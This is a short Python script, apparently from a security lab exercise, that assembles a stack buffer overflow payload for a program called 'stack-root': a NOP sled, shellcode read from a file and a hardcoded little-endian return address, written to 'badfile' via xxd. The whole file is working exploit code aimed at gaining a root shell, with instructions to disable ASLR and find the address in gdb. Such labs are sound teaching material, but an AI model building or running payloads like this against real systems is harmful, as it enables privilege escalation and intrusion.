# This code creates a payload that is written to 'badfile' for use with the stack-root program
# For this to work, ASLR must be turned off, and gdb needs to be used to find the correct 
# return address, which must be inputted in the return_address (N.B. - The return memory
# address must be reversed to allow for little endian memory style)

import os

# Get payload shellcode
fr = open("shell_code","r")
shellcode = fr.read()
fr.close()

# Construct exploit input padding parts
nop_sled = "90 " * 12 + "\n"      # NOP Sled to increase hit chance (new line for readability)
return_address = "08 f5 ff bf"    # Reversed return address for little endian (spaces ignored)

# Assemble exploit and print
exploit = nop_sled + shellcode + return_address
print("Exploit outputted: ")
print(exploit)

# Write exploit to file for hex conversion
fw = open("shell_out","w+")
fw.write(exploit)
fw.close()

# Carry out hex conversion using bash cmd
os.system("xxd -p -r shell_out > badfile")
